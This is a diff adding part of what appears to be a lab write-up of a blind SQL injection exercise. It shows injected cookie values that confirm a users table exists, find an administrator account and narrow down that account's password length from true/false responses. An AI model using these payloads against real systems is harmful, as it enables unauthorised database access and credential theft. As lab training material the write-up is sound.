@@ -170,3 +170,29 @@ but when we input it well ->
 
 <figure><img src="../.gitbook/assets/image (821).png" alt=""><figcaption></figcaption></figure>
 
+To verify there is a table called users ->
+
+```
+TrackingId=fNg3RnqiOBbPgwwI'AND (SELECT 'a' FROM users LIMIT 1)='a
+```
+
+* `AND`: This is a logical operator used to combine conditions in SQL queries.
+* `(SELECT 'a' FROM users LIMIT 1)='a'`: This part is a subquery. It's attempting to select the character `'a'` from the `users` table with a limit of 1 row. Then, it compares this selected value with the character `'a'`.
+
+Now i want to check if there is a administrator user like the exercice says:
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+```
+TrackingId=fNg3RnqiOBbPgwwI'AND (SELECT 'a' FROM users WHERE username='administrator')='a
+```
+
+Now we need to determine the length of the password ->
+
+```
+TrackingId=fNg3RnqiOBbPgwwI'AND (SELECT 'b' FROM users WHERE username='administrator' AND LENGTH (password)>19)='b
+```
+
+This returns us Welcome back assuming that it is true but when we put in 20 we don't have it anymore. Just to be sure, we can change to = ->
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
